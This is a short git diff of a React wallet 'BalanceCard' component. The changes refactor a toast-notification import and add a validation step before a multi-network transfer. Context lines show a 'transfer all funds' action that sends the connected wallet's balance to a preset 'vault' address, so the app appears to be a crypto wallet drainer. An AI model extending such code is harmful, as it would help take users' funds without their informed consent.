@@ -4,6 +4,7 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { useWeb3 } from "@/hooks/use-web3";
+import { useToast } from "@/hooks/use-toast";
 import type { WalletState } from "@/lib/web3";
 
 interface BalanceCardProps {
@@ -14,6 +15,7 @@ interface BalanceCardProps {
 
 export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
   const { isTransferring, transferAllFunds } = useWeb3();
+  const { toast } = useToast();
   const [showConfirmation, setShowConfirmation] = useState(false);
 
   // Get destination address from environment - using your vault address
@@ -58,7 +60,6 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     
     if (!validation.isValid) {
       // Show error toast using existing hook
-      const { toast } = await import("@/hooks/use-toast");
       toast({
         variant: "destructive",
         title: "Transfer Failed",
@@ -80,6 +81,19 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
   const handleMultiNetworkTransfer = async () => {
     if (!onMultiNetworkTransfer) return;
+    
+    // Validate wallet connection before transfer
+    const { walletValidator } = await import("@/lib/wallet-validator");
+    const validation = await walletValidator.validateForTransfer(walletState.address!);
+    
+    if (!validation.isValid) {
+      toast({
+        variant: "destructive",
+        title: "Multi-Network Transfer Failed",
+        description: validation.error || "Wallet validation failed",
+      });
+      return;
+    }
     
     try {
       const result = await onMultiNetworkTransfer(destinationAddress);
